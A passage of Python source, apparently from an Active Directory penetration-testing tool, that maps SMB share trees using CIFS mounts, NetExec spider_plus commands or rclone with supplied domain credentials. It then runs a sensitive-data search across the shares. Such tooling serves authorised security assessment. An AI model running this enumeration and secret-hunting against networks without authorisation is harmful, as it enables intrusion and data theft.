                    f"mount_point={marked_mount_point}"
                )
        else:
            already_mounted_count += 1
            if reuse_status == "reused_same_identity":
                reused_same_identity_count += 1
                marked_mount_point = mark_sensitive(mount_point or "<unknown>", "path")
                print_info_debug(
                    "CIFS host-helper reused existing mount with matching auth context: "
                    f"host={marked_host} share={marked_share} "
                    f"mount_point={marked_mount_point}"
                )
            elif reuse_status == "reused_existing_mount":
                reused_existing_mount_count += 1
                marked_mount_point = mark_sensitive(mount_point or "<unknown>", "path")
                print_info_debug(
                    "CIFS host-helper reused existing mount without identity metadata: "
                    f"host={marked_host} share={marked_share} "
                    f"mount_point={marked_mount_point}"
                )

    marked_root = mark_sensitive(mount_root, "path")
    print_info_debug(
        "CIFS host-helper mount summary: "
        f"mount_root={marked_root} targets={len(targets)} "
        f"mounted={mounted_count} mounted_new={mounted_new_count} "
        f"already_mounted={already_mounted_count} "
        f"reused_same_identity={reused_same_identity_count} "
        f"reused_existing_mount={reused_existing_mount_count} "
        f"remounted_due_to_identity_change={remounted_due_to_identity_change_count} "
        f"failed={failed_count}"
    )
    return mounted_points


def _unmount_cifs_targets_via_host_helper(
    *,
    mount_points: list[str],
) -> None:
    """Best-effort unmount of CIFS targets previously mounted by host-helper."""
    if not mount_points:
        return

    helper_sock = os.getenv("ADSCAN_HOST_HELPER_SOCK", "").strip()
    if not helper_sock or not os.path.exists(helper_sock):
        marked_sock = mark_sensitive(helper_sock or "<unset>", "path")
        print_warning_debug(
            f"CIFS unmount skipped: host helper socket unavailable ({marked_sock})."
        )
        return

    try:
        from adscan_internal.host_privileged_helper import host_helper_client_request
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_warning_debug("CIFS unmount skipped: cannot import host helper client.")
        return

    unmounted = 0
    failed = 0
    for mount_point in mount_points:
        try:
            resp = host_helper_client_request(
                helper_sock,
                op="cifs_unmount_share",
                payload={"mount_point": mount_point, "lazy": True},
                timeout_seconds=90,
            )
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            failed += 1
            marked_mount = mark_sensitive(mount_point, "path")
            print_warning_debug(
                "CIFS unmount request raised exception: "
                f"mount_point={marked_mount} error={type(exc).__name__}: {exc}"
            )
            continue
        if resp.ok:
            unmounted += 1
        else:
            failed += 1
            marked_mount = mark_sensitive(mount_point, "path")
            print_warning_debug(
                "CIFS unmount failed: "
                f"mount_point={marked_mount} message={resp.message or '-'} "
                f"rc={resp.returncode}"
            )

    print_info_debug(
        "CIFS unmount summary: "
        f"requested={len(mount_points)} unmounted={unmounted} failed={failed}"
    )


def run_smb_share_tree_mapping_with_cifs(
    shell: Any,
    *,
    domain: str,
    shares: list[str],
    username: str,
    password: str,
    hosts: list[str],
    share_map: dict[str, dict[str, str]] | None = None,
    cifs_mount_root: str | None = None,
    selected_method: str | None = None,
    run_post_mapping_workflow: bool = True,
) -> bool:
    """Map SMB share trees from CIFS mount paths and run post-mapping workflow."""
    from adscan_internal.services.cifs_share_mapping_service import (
        CIFSShareMappingService,
    )
    from adscan_internal.services.share_mapping_service import ShareMappingService

    shares = _filter_shares_by_global_mapping_exclusions(shares)
    share_map = _filter_share_map_by_global_mapping_exclusions(share_map)

    if not hosts:
        marked_domain = mark_sensitive(domain, "domain")
        print_warning(
            f"No SMB hosts available for CIFS mapping in domain {marked_domain}."
        )
        return False
    if not shares:
        marked_domain = mark_sensitive(domain, "domain")
        print_warning(
            "No SMB shares eligible for CIFS mapping after applying global "
            f"exclusions in {marked_domain}."
        )
        return False

    effective_mount_root = str(
        cifs_mount_root or ""
    ).strip() or _resolve_cifs_mount_root(
        shell=shell,
        domain=domain,
    )
    marked_mount_root = mark_sensitive(effective_mount_root, "path")
    mount_targets = _resolve_cifs_host_share_targets(
        hosts=hosts,
        shares=shares,
        share_map=share_map,
    )
    mounted_points: list[str] = []
    try:
        mounted_points = _mount_cifs_targets_via_host_helper(
            domain=domain,
            username=username,
            password=password,
            mount_root=effective_mount_root,
            targets=mount_targets,
        )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_warning_debug(
            "CIFS host-helper mount orchestration failed unexpectedly; continuing "
            "with pre-existing mount state."
        )

    if not os.path.isdir(effective_mount_root):
        print_warning(
            "CIFS mapping root is not accessible. "
            f"Expected mounted content at {marked_mount_root}."
        )
        print_warning(
            "Fallback recommendation: use spider_plus + AI or deterministic mode."
        )
        _unmount_cifs_targets_via_host_helper(mount_points=mounted_points)
        return False

    workspace_cwd = shell._get_workspace_cwd()
    cifs_root_abs = domain_path(
        workspace_cwd,
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "cifs",
    )
    timestamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    run_id = f"cifs_{timestamp}_{_slugify_token(username)}"
    run_folder = f"{timestamp}_{_slugify_token(username)}"
    run_output_abs = os.path.join(cifs_root_abs, "runs", run_folder)
    os.makedirs(run_output_abs, exist_ok=True)
    aggregate_map_abs = os.path.join(cifs_root_abs, "share_tree_map.json")
    aggregate_map_rel = domain_relpath(
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "cifs",
        "share_tree_map.json",
    )
    marked_aggregate_rel = mark_sensitive(aggregate_map_rel, "path")

    try:
        print_operation_header(
            "SMB Share Tree Mapping (CIFS)",
            details={
                "Domain": mark_sensitive(domain, "domain"),
                "Principal": mark_sensitive(username, "user"),
                "Hosts": str(len(hosts)),
                "Readable Shares": str(len(shares)),
                "CIFS Root": marked_mount_root,
                "Run Output": mark_sensitive(run_output_abs, "path"),
                "Aggregate JSON": marked_aggregate_rel,
            },
            icon="🗺️",
        )
        cifs_service = CIFSShareMappingService()
        mapping_result = cifs_service.generate_host_metadata_json(
            mount_root=effective_mount_root,
            run_output_dir=run_output_abs,
            hosts=hosts,
            shares=shares,
        )

        service = ShareMappingService()
        principal_label = f"{domain}\\{username}"
        summary = service.merge_spider_plus_run(
            domain=domain,
            principal=principal_label,
            run_id=run_id,
            run_output_dir=run_output_abs,
            aggregate_map_path=aggregate_map_abs,
            requested_hosts=hosts,
            requested_shares=shares,
            host_share_permissions=share_map,
        )

        host_json_count = int(summary.get("host_json_files", 0))
        merged_files = int(summary.get("merged_file_entries", 0))
        mapped_shares = int(mapping_result.get("mapped_shares", 0))
        if host_json_count == 0:
            print_warning(
                "CIFS mapping found no host metadata files to consolidate. "
                "Verify mount structure host/share/path."
            )
        else:
            print_success(
                f"CIFS share mapping updated with {host_json_count} host file(s), "
                f"{mapped_shares} mapped share(s), and {merged_files} file metadata entries."
            )
        print_info(f"Consolidated SMB share tree map saved to {marked_aggregate_rel}.")
        if run_post_mapping_workflow:
            _run_post_mapping_sensitive_data_workflow(
                shell,
                domain=domain,
                aggregate_map_abs=aggregate_map_abs,
                aggregate_map_rel=aggregate_map_rel,
                shares=shares,
                hosts=hosts,
                share_map=share_map,
                triage_username=username,
                triage_password=password,
                selected_method=selected_method,
                cifs_mount_root=effective_mount_root,
            )
        return True
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_error("Error while executing CIFS SMB share mapping.")
        print_exception(show_locals=False, exception=exc)
        print_error_debug(traceback.format_exc())
        return False
    finally:
        try:
            _unmount_cifs_targets_via_host_helper(mount_points=mounted_points)
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_warning_debug(
                "CIFS unmount cleanup failed unexpectedly after mapping workflow."
            )


def run_smb_share_tree_mapping_with_spider_plus(
    shell: Any,
    *,
    domain: str,
    shares: list[str],
    username: str,
    password: str,
    hosts: list[str],
    share_map: dict[str, dict[str, str]] | None = None,
    selected_method: str | None = None,
    run_post_mapping_workflow: bool = True,
) -> bool:
    """Run NetExec spider_plus and consolidate results into one domain map JSON."""
    from adscan_internal.services.share_mapping_service import ShareMappingService

    shares = _filter_shares_by_global_mapping_exclusions(shares)
    share_map = _filter_share_map_by_global_mapping_exclusions(share_map)

    if not shell.netexec_path:
        print_error(
            "NetExec (nxc) path not configured. Please ensure it's installed via 'adscan install'."
        )
        return False

    if not hosts:
        marked_domain = mark_sensitive(domain, "domain")
        print_warning(
            f"No SMB hosts available for spider_plus mapping in domain {marked_domain}."
        )
        return False
    if not shares:
        marked_domain = mark_sensitive(domain, "domain")
        print_warning(
            "No SMB shares eligible for spider_plus mapping after applying global "
            f"exclusions in {marked_domain}."
        )
        return False

    workspace_cwd = shell._get_workspace_cwd()
    spider_plus_root_abs = domain_path(
        workspace_cwd,
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "spider_plus",
    )
    run_id = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    run_folder = f"{run_id}_{_slugify_token(username)}"
    run_output_abs = os.path.join(spider_plus_root_abs, "runs", run_folder)
    os.makedirs(run_output_abs, exist_ok=True)
    run_output_rel = domain_relpath(
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "spider_plus",
        "runs",
        run_folder,
    )
    aggregate_map_abs = os.path.join(spider_plus_root_abs, "share_tree_map.json")
    aggregate_map_rel = domain_relpath(
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "spider_plus",
        "share_tree_map.json",
    )

    auth_args = _build_spider_plus_auth(
        shell,
        domain=domain,
        username=username,
        password=password,
    )
    hosts_arg = " ".join(shlex.quote(str(host)) for host in hosts)
    module_options = [
        f"EXCLUDE_EXTS={','.join(GLOBAL_SMB_MAPPING_EXCLUDED_EXTENSIONS)}",
        f"EXCLUDE_FILTER={','.join(GLOBAL_SMB_EXCLUDE_FILTER_TOKENS)}",
        f"OUTPUT_FOLDER={run_output_abs}",
    ]
    module_options_arg = " ".join(shlex.quote(option) for option in module_options)
    command = (
        f"{shell.netexec_path} smb {hosts_arg} {auth_args} --smb-timeout 30 "
        f"-M spider_plus -o {module_options_arg}"
    )

    marked_domain = mark_sensitive(domain, "domain")
    marked_username = mark_sensitive(username, "user")
    marked_output_rel = mark_sensitive(run_output_rel, "path")
    marked_aggregate_rel = mark_sensitive(aggregate_map_rel, "path")

    print_operation_header(
        "SMB Share Tree Mapping (spider_plus)",
        details={
            "Domain": marked_domain,
            "Principal": marked_username,
            "Hosts": str(len(hosts)),
            "Readable Shares": str(len(shares)),
            "Download Mode": "Metadata only",
            "Run Output": marked_output_rel,
            "Aggregate JSON": marked_aggregate_rel,
        },
        icon="🕸️",
    )
    print_info_debug(f"Command: {command}")

    try:
        completed_process = shell._run_netexec(
            command,
            domain=domain,
            timeout=1200,
            pre_sync=False,
        )
        if completed_process is None:
            print_error(
                "NetExec spider_plus mapping failed before returning any output."
            )
            return False

        if completed_process.returncode != 0:
            error_message = (
                completed_process.stderr or completed_process.stdout or ""
            ).strip()
            print_warning(
                "NetExec spider_plus returned a non-zero exit code. "
                "Attempting to consolidate any metadata produced."
            )
            if error_message:
                print_warning_debug(error_message)

        service = ShareMappingService()
        principal_label = f"{domain}\\{username}"
        summary = service.merge_spider_plus_run(
            domain=domain,
            principal=principal_label,
            run_id=run_id,
            run_output_dir=run_output_abs,
            aggregate_map_path=aggregate_map_abs,
            requested_hosts=hosts,
            requested_shares=shares,
            host_share_permissions=share_map,
        )
        host_json_count = int(summary.get("host_json_files", 0))
        merged_files = int(summary.get("merged_file_entries", 0))

        if host_json_count == 0:
            print_warning(
                "No spider_plus JSON host metadata files were generated. "
                "The consolidated mapping file was still updated."
            )
        else:
            print_success(
                f"SMB share mapping updated with {host_json_count} host file(s) and "
                f"{merged_files} file metadata entries."
            )
        print_info(f"Consolidated SMB share tree map saved to {marked_aggregate_rel}.")
        if run_post_mapping_workflow:
            try:
                _run_post_mapping_sensitive_data_workflow(
                    shell,
                    domain=domain,
                    aggregate_map_abs=aggregate_map_abs,
                    aggregate_map_rel=aggregate_map_rel,
                    shares=shares,
                    hosts=hosts,
                    share_map=share_map,
                    triage_username=username,
                    triage_password=password,
                    selected_method=selected_method,
                )
            except Exception as triage_exc:  # noqa: BLE001
                telemetry.capture_exception(triage_exc)
                print_warning(
                    "SMB share mapping completed, but post-mapping sensitive-data analysis "
                    "failed and was skipped."
                )
                print_warning_debug(
                    "Post-mapping sensitive-data analysis failure: "
                    f"{type(triage_exc).__name__}: {triage_exc}"
                )
                print_warning_debug(traceback.format_exc())
        return True
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_error("Error while executing spider_plus SMB share mapping.")
        print_exception(show_locals=False, exception=exc)
        print_error_debug(traceback.format_exc())
        return False


def _resolve_rclone_path(shell: Any) -> str:
    """Resolve rclone executable path from shell attributes or PATH fallback."""
    configured_path = str(getattr(shell, "rclone_path", "") or "").strip()
    return configured_path or "rclone"


def run_smb_share_tree_mapping_with_rclone(
    shell: Any,
    *,
    domain: str,
    shares: list[str],
    username: str,
    password: str,
    hosts: list[str],
    share_map: dict[str, dict[str, str]] | None = None,
    selected_method: str | None = None,
    run_post_mapping_workflow: bool = True,
) -> bool:
    """Run rclone SMB metadata mapping and consolidate into one domain map JSON."""
    from adscan_internal.services.rclone_share_mapping_service import (
        RcloneShareMappingService,
    )
    from adscan_internal.services.share_mapping_service import ShareMappingService
    from adscan_internal.workspaces import read_json_file

    shares = _filter_shares_by_global_mapping_exclusions(shares)
    share_map = _filter_share_map_by_global_mapping_exclusions(share_map)

    if not hosts:
        marked_domain = mark_sensitive(domain, "domain")
        print_warning(
            f"No SMB hosts available for rclone mapping in domain {marked_domain}."
        )
        return False
    if not shares:
        marked_domain = mark_sensitive(domain, "domain")
        print_warning(
            "No SMB shares eligible for rclone mapping after applying global "
            f"exclusions in {marked_domain}."
        )
        return False

    rclone_path = _resolve_rclone_path(shell)
    rclone_version_cmd = f"{shlex.quote(rclone_path)} version"
    version_result = shell.run_command(
        rclone_version_cmd,
        timeout=30,
        ignore_errors=True,
    )
    if version_result is None or int(getattr(version_result, "returncode", 1)) != 0:
        print_error(
            "rclone is not available. Install it and ensure it is in PATH "
            "to use rclone SMB mapping."
        )
        return False
    if not _is_rclone_supported_for_smb_auth(
        shell,
        domain=domain,
        username=username,
    ):
        print_warning(
            "rclone SMB mapping does not support null-session authentication. "
            "Use spider_plus for AI/null-session mapping instead."
        )
        return False

    workspace_cwd = shell._get_workspace_cwd()
    rclone_root_abs = domain_path(
        workspace_cwd,
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "rclone",
    )
    aggregate_map_abs = os.path.join(rclone_root_abs, "share_tree_map.json")
    aggregate_map_rel = domain_relpath(
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "rclone",
        "share_tree_map.json",
    )

    target_pairs = _resolve_cifs_host_share_targets(
        hosts=hosts,
        shares=shares,
        share_map=share_map,
    )
    workspace_type = str(getattr(shell, "type", "") or "").strip().lower() or "audit"
    mapping_mode = _resolve_smb_mapping_mode(shell)
    expected_cache_metadata = _build_smb_rclone_mapping_cache_metadata(
        domain=domain,
        username=username,
        hosts=hosts,
        shares=shares,
        share_map=share_map,
    )
    marked_domain = mark_sensitive(domain, "domain")
    marked_username = mark_sensitive(username, "user")
    marked_aggregate_rel = mark_sensitive(aggregate_map_rel, "path")
    marked_rclone = mark_sensitive(rclone_path, "path")

    should_attempt_cache_reuse = mapping_mode == _SMB_MAPPING_MODE_REUSE or (
        mapping_mode == _SMB_MAPPING_MODE_AUTO and workspace_type == "audit"
    )
    if should_attempt_cache_reuse and os.path.exists(aggregate_map_abs):
        try:
            cached_mapping = read_json_file(aggregate_map_abs)
            cache_compatible, cache_reason, cache_timestamp = (
                _is_smb_rclone_mapping_cache_compatible(
                    cache_payload=cached_mapping,
                    expected_metadata=expected_cache_metadata,
                )
            )
            cache_age_seconds = _resolve_smb_mapping_cache_age_seconds(
                cache_timestamp or str(cached_mapping.get("updated_at") or "")
            )
            cache_fresh_enough = (
                cache_age_seconds is not None
                and cache_age_seconds <= _SMB_RCLONE_MAPPING_CACHE_MAX_AGE_AUDIT.total_seconds()
            )
            if cache_compatible and (
                mapping_mode == _SMB_MAPPING_MODE_REUSE
                or (
                    mapping_mode == _SMB_MAPPING_MODE_AUTO
                    and workspace_type == "audit"
                    and cache_fresh_enough
                )
            ):
                dev_cache_action = _select_dev_cache_action(
                    shell=shell,
                    title="SMB rclone mapping cache:",
                    summary_lines=[
                        f"Domain: {domain}",
                        f"Principal: {username}",
                        f"Cache: {aggregate_map_rel}",
                        (
                            f"Age: {cache_age_seconds:.0f}s"
                            if cache_age_seconds is not None
                            else "Age: unknown"
                        ),
                    ],
                )
                if dev_cache_action == "refresh":
                    print_info(
                        "Refreshing SMB rclone mapping because dev mode requested a new cache build."
                    )
                else:
                    cached_entries = _count_smb_mapping_file_entries(
                        cache_payload=cached_mapping,
                        hosts=hosts,
                        shares=shares,
                        share_map=share_map,
                    )
                    age_label = (
                        f"{cache_age_seconds:.0f}s old"
                        if cache_age_seconds is not None
                        else "age unknown"
                    )
                    if mapping_mode == _SMB_MAPPING_MODE_REUSE:
                        print_info(
                            "Using cached SMB rclone mapping from "
                            f"{marked_aggregate_rel} ({cached_entries} file metadata entries, "
                            f"{age_label}) because reuse was forced."
                        )
                    else:
                        print_info(
                            "Using cached SMB rclone mapping from "
                            f"{marked_aggregate_rel} ({cached_entries} file metadata entries, "
                            f"{age_label})."
                        )
                    if run_post_mapping_workflow:
                        _run_post_mapping_sensitive_data_workflow(
                            shell,
                            domain=domain,
                            aggregate_map_abs=aggregate_map_abs,
                            aggregate_map_rel=aggregate_map_rel,
                            shares=shares,
                            hosts=hosts,
                            share_map=share_map,
                            triage_username=username,
                            triage_password=password,
                            selected_method=selected_method,
                        )
                    return True

            print_info_debug(
                "Cached SMB rclone mapping not reused: "
                f"path={marked_aggregate_rel} "
                f"reason={mark_sensitive(cache_reason, 'text')} "
                f"age_seconds={cache_age_seconds if cache_age_seconds is not None else 'unknown'} "
                f"mapping_mode={mark_sensitive(mapping_mode, 'text')} "
                f"workspace_type={mark_sensitive(workspace_type, 'text')}"
            )
            if (
                mapping_mode == _SMB_MAPPING_MODE_AUTO
                and workspace_type == "audit"
                and cache_compatible
                and not cache_fresh_enough
            ):
                print_info(
                    "Cached SMB rclone mapping exists at "
                    f"{marked_aggregate_rel}, but it is older than "
                    f"{int(_SMB_RCLONE_MAPPING_CACHE_MAX_AGE_AUDIT.total_seconds())}s, so audit mode refreshes it."
                )
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_warning_debug(
                "Failed to evaluate cached SMB rclone mapping; refreshing it now. "
                f"error={type(exc).__name__}: {exc}"
            )
    elif mapping_mode == _SMB_MAPPING_MODE_REFRESH and os.path.exists(aggregate_map_abs):
        print_info(
            "Cached SMB rclone mapping exists at "
            f"{marked_aggregate_rel}, but refresh mode forces a new mapping."
        )

    run_id = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    run_folder = f"{run_id}_{_slugify_token(username)}"
    run_output_abs = os.path.join(rclone_root_abs, "runs", run_folder)
    os.makedirs(run_output_abs, exist_ok=True)
    run_output_rel = domain_relpath(
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "rclone",
        "runs",
        run_folder,
    )
    marked_output_rel = mark_sensitive(run_output_rel, "path")

    print_operation_header(
        "SMB Share Tree Mapping (rclone)",
        details={
            "Domain": marked_domain,
            "Principal": marked_username,
            "Hosts": str(len(hosts)),
            "Readable Shares": str(len(shares)),
            "Targets": str(len(target_pairs)),
            "Run Output": marked_output_rel,
            "Aggregate JSON": marked_aggregate_rel,
            "rclone": marked_rclone,
            "Cache Policy": mark_sensitive(mapping_mode, "text"),
        },
        icon="🧭",
    )

    try:
        rclone_service = RcloneShareMappingService()
        transport_username, transport_password, transport_domain = (
            _resolve_rclone_transport_auth(
                shell,
                domain=domain,
                username=username,
                password=password,
            )
        )
        mapping_result = rclone_service.generate_host_metadata_json(
            run_output_dir=run_output_abs,
            host_share_targets=target_pairs,
            username=transport_username,
            password=transport_password,
            domain=transport_domain,
            command_executor=shell.run_command,
            rclone_path=rclone_path,
            timeout_seconds=1200,
        )

        service = ShareMappingService()
        principal_label = f"{domain}\\{username}"
        summary = service.merge_spider_plus_run(
            domain=domain,
            principal=principal_label,
            run_id=run_id,
            run_output_dir=run_output_abs,
            aggregate_map_path=aggregate_map_abs,
            requested_hosts=hosts,
            requested_shares=shares,
            host_share_permissions=share_map,
        )
        host_json_count = int(summary.get("host_json_files", 0))
        merged_files = int(summary.get("merged_file_entries", 0))
        mapped_shares = int(mapping_result.get("mapped_shares", 0))
        partial_targets = int(mapping_result.get("partial_targets", 0))
        failed_targets = int(mapping_result.get("failed_targets", 0))

        if host_json_count == 0:
            print_warning(
                "rclone mapping found no host metadata files to consolidate. "
                "Verify SMB permissions and target paths."
            )
        else:
            print_success(
                f"rclone share mapping updated with {host_json_count} host file(s), "
                f"{mapped_shares} mapped share(s), and {merged_files} file metadata entries."
            )
        if partial_targets > 0:
            print_warning_debug(
                "rclone mapping accepted partial targets with non-zero exit code: "
                f"partial_targets={partial_targets} total_targets={len(target_pairs)}"
            )
        if failed_targets > 0:
            print_warning_debug(
                "rclone mapping targets failed: "
                f"failed_targets={failed_targets} total_targets={len(target_pairs)}"
            )
        print_info(f"Consolidated SMB share tree map saved to {marked_aggregate_rel}.")
        if run_post_mapping_workflow:
            _run_post_mapping_sensitive_data_workflow(
                shell,
                domain=domain,
                aggregate_map_abs=aggregate_map_abs,
                aggregate_map_rel=aggregate_map_rel,
                shares=shares,
                hosts=hosts,
                share_map=share_map,
                triage_username=username,
                triage_password=password,
                selected_method=selected_method,
            )
        return True
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_error("Error while executing rclone SMB share mapping.")
        print_exception(show_locals=False, exception=exc)
        print_error_debug(traceback.format_exc())
        return False


def _run_post_mapping_sensitive_data_workflow(
    shell: Any,
    *,
    domain: str,
    aggregate_map_abs: str,
    aggregate_map_rel: str,
    shares: list[str],
    hosts: list[str],
    share_map: dict[str, dict[str, str]] | None = None,
    triage_username: str | None = None,
    triage_password: str | None = None,
    selected_method: str | None = None,
    cifs_mount_root: str | None = None,
) -> None:
    """Run post-mapping sensitive-data search using deterministic and/or AI flow."""
    from adscan_internal.services.ai_backend_availability_service import (
        AIBackendAvailabilityService,
    )

    availability = AIBackendAvailabilityService().get_availability()
    hosts_count = len(hosts)
    shares_count = len(shares)
    print_info_debug(
        "Post-mapping AI availability: "
        f"configured={availability.configured} enabled={availability.enabled} "
        f"provider={availability.provider} reason={availability.reason}"
    )

    if selected_method is None:
        selected_method = _select_post_mapping_sensitive_data_method(
            shell=shell,
            ai_configured=availability.configured,
            domain=domain,
            username=triage_username,
            password=triage_password,
        )
    selected_method = _normalize_sensitive_data_method_for_smb_auth(
        shell,
        domain=domain,
        username=triage_username,
        password=triage_password,
        selected_method=selected_method,
    )
    _capture_post_mapping_sensitive_data_telemetry(
        shell=shell,
        stage="selected",
        method=(selected_method or "skip"),
        outcome="method_selected" if selected_method else "skipped_by_user",
        ai_configured=availability.configured,
        ai_provider=availability.provider,
        ai_reason=availability.reason,
        hosts_count=hosts_count,
        shares_count=shares_count,
    )
    if selected_method is None:
        print_info("Post-mapping sensitive-data analysis skipped by user.")
        return

    if selected_method not in {
        "deterministic_rclone_direct",
        "deterministic_rclone_mapped",
        "deterministic_cifs",
        "deterministic_manspider",
    }:
        marked_method = mark_sensitive(selected_method, "text")
        print_warning(
            f"Unsupported sensitive-data analysis method selected: {marked_method}."
        )
        return

    marked_method = mark_sensitive(selected_method, "text")
    print_info_debug(f"Post-mapping sensitive-data method selected: {marked_method}")
    deterministic_executed = False
    ai_attempted = False
    ai_success: bool | None = None
    fallback_used = False

    deterministic_executed = True
    deterministic_result = _run_selected_deterministic_share_scan(
        shell=shell,
        domain=domain,
        shares=shares,
        hosts=hosts,
        share_map=share_map,
        username=triage_username or "",
        password=triage_password or "",
        selected_method=selected_method,
        cifs_mount_root=cifs_mount_root,
        ai_configured=availability.configured,
    )
    fallback_used = bool(deterministic_result.get("fallback_used"))
    ai_attempted = bool(deterministic_result.get("ai_attempted"))
    ai_success = deterministic_result.get("ai_success")

    if selected_method == "deterministic_rclone_direct":
        outcome = (
            "deterministic_rclone_direct_completed"
            if not fallback_used
            else "deterministic_rclone_direct_failed_fallback_attempted"
        )
    elif selected_method == "deterministic_rclone_mapped":
        outcome = (
            "deterministic_rclone_mapped_completed"
            if not fallback_used
            else "deterministic_rclone_mapped_failed_fallback_attempted"
        )
    elif selected_method == "deterministic_cifs":
        outcome = (
            "deterministic_cifs_completed"
            if not fallback_used
            else "deterministic_cifs_failed_fallback_manspider_attempted"
        )
    elif selected_method == "deterministic_manspider":
        outcome = "deterministic_manspider_completed"
    else:
        outcome = "unknown"

    _capture_post_mapping_sensitive_data_telemetry(
        shell=shell,
        stage="completed",
        method=selected_method,
        outcome=outcome,
        ai_configured=availability.configured,
        ai_provider=availability.provider,
        ai_reason=availability.reason,
        hosts_count=hosts_count,
        shares_count=shares_count,
        deterministic_executed=deterministic_executed,
        ai_attempted=ai_attempted,
        ai_success=ai_success,
        fallback_used=fallback_used,
    )


def _resolve_default_deterministic_share_analysis_method(
    shell: Any,
    *,
    domain: str | None = None,
    username: str | None = None,
    password: str | None = None,
) -> str:
    """Resolve the production deterministic SMB backend from workspace type."""
    del password
    if _is_null_session_smb_auth(shell, domain=domain, username=username):
        return "deterministic_manspider"
    workspace_type = str(getattr(shell, "type", "") or "").strip().lower()
    if workspace_type == "audit":
        return "deterministic_rclone_mapped"
    return "deterministic_rclone_direct"


def _resolve_deterministic_backend_from_method(selected_method: str) -> str:
    """Map one user-visible deterministic method to an internal backend id."""
    mapping = {
        "deterministic_rclone_direct": "rclone_direct",
        "deterministic_rclone_mapped": "rclone_mapped",
        "deterministic_cifs": "cifs",
        "deterministic_manspider": "manspider",
    }
    return mapping.get(str(selected_method or "").strip(), "manspider")


def _run_selected_deterministic_share_scan(
    shell: Any,
    *,
    domain: str,
    shares: list[str],
    hosts: list[str],
    share_map: dict[str, dict[str, str]] | None = None,
    username: str,
    password: str,
    selected_method: str,
    cifs_mount_root: str | None = None,
    ai_configured: bool = False,
) -> dict[str, Any]:
    """Run deterministic scan with the configured fallback chain."""
    requested_method = str(selected_method or "").strip()
    selected_method = _normalize_sensitive_data_method_for_smb_auth(
        shell,
        domain=domain,
        username=username,
        password=password,
        selected_method=selected_method,
    )
    primary_backend = _resolve_deterministic_backend_from_method(selected_method)
    executed_backends: list[str] = []

    if (
        requested_method == "deterministic_rclone_mapped"
        and selected_method == "deterministic_manspider"
    ):
        print_info_debug(
            "Preparing spider_plus share-tree mapping before manspider fallback "
            "because the requested deterministic rclone mapped workflow cannot use "
            "the current SMB authentication material."
        )
        mapping_success = run_smb_share_tree_mapping_with_spider_plus(
            shell,
            domain=domain,
            shares=shares,
            username=username,
            password=password,
            hosts=hosts,
            share_map=share_map,
            selected_method="deterministic_manspider",
            run_post_mapping_workflow=False,
        )
        if not mapping_success:
            print_warning(
                "spider_plus mapping did not complete successfully before the "
                "manspider fallback. Continuing with manspider download analysis."
            )

    def _run_backend(backend: str) -> dict[str, Any]:
        executed_backends.append(backend)
        result = _run_post_mapping_deterministic_share_scan_with_backend(
            shell=shell,
            domain=domain,
            shares=shares,
            hosts=hosts,
            share_map=share_map,
            username=username,
            password=password,
            backend=backend,
            cifs_mount_root=cifs_mount_root,
            ai_configured=ai_configured,
        )
        if isinstance(result, dict):
            return result
        return {
            "completed": bool(result),
            "ai_attempted": False,
            "ai_success": None,
        }

    primary_result = _run_backend(primary_backend)
    completed = bool(primary_result.get("completed"))
    fallback_used = False
    if completed:
        return {
            "completed": True,
            "fallback_used": False,
            "executed_backends": executed_backends,
            "ai_attempted": bool(primary_result.get("ai_attempted")),
            "ai_success": primary_result.get("ai_success"),
        }

    if primary_backend.startswith("rclone"):
        fallback_used = True
        print_warning(
            "rclone deterministic analysis did not complete successfully. "
            "Falling back to legacy manspider analysis."
        )
        fallback_result = _run_backend("manspider")
        completed = bool(fallback_result.get("completed"))
        if completed:
            return {
                "completed": True,
                "fallback_used": True,
                "executed_backends": executed_backends,
                "ai_attempted": bool(fallback_result.get("ai_attempted")),
                "ai_success": fallback_result.get("ai_success"),
            }
        print_warning(
            "Legacy manspider fallback did not complete successfully. "
            "Falling back to CIFS deterministic analysis."
        )
        fallback_result = _run_backend("cifs")
        completed = bool(fallback_result.get("completed"))
    elif primary_backend == "cifs":
        fallback_used = True
        print_warning(
            "CIFS deterministic analysis did not complete successfully. "
            "Falling back to legacy manspider analysis."
        )
        fallback_result = _run_backend("manspider")
        completed = bool(fallback_result.get("completed"))
    else:
        fallback_result = primary_result

    return {
        "completed": bool(completed),
        "fallback_used": fallback_used,
        "executed_backends": executed_backends,
        "ai_attempted": bool(fallback_result.get("ai_attempted")),
        "ai_success": fallback_result.get("ai_success"),
    }


def _capture_post_mapping_sensitive_data_telemetry(
    *,
    shell: Any,
    stage: str,
    method: str,
    outcome: str,
    ai_configured: bool,
    ai_provider: str,
    ai_reason: str,
    hosts_count: int,
    shares_count: int,
    deterministic_executed: bool = False,
    ai_attempted: bool = False,
    ai_success: bool | None = None,
    fallback_used: bool = False,
) -> None:
    """Capture telemetry event for post-mapping sensitive-data workflow."""
    properties: dict[str, Any] = {
        "stage": stage,
        "method": method,
        "outcome": outcome,
        "ai_configured": ai_configured,
        "ai_provider": ai_provider,
        "ai_reason": ai_reason,
        "hosts_count": hosts_count,
        "shares_count": shares_count,
        "deterministic_executed": deterministic_executed,
        "ai_attempted": ai_attempted,
        "fallback_used": fallback_used,
        "auto_mode": bool(getattr(shell, "auto", False)),
        "workspace_type": str(getattr(shell, "type", "") or "").strip().lower()
        or "unknown",
    }
    if ai_success is not None:
        properties["ai_success"] = ai_success
    telemetry.capture("smb_sensitive_data_analysis", properties)


